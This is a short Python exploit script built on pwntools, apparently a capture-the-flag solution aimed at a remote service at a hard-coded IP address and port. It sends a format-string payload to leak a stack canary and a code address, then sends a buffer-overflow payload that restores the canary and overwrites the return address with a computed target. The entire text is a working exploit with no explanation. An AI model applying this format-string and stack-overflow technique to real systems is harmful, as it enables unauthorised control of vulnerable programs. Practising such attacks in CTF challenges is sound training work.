from pwn import *

payload1 = '%11$x %15$x'

payload2 = 'A'*25

p = remote('95.216.233.106',15021)
print p.recvuntil('?\n')
p.sendline(payload1)
a = p.recvline()
print a
canary = p32(int(a.split()[2],16))
flag = p32(int(a.split()[3][:-1],16)-113-351)
payload2+=canary
payload2+='A'*12
payload2+=flag
print p.recv()
p.sendline(payload2)
print p.recvall()
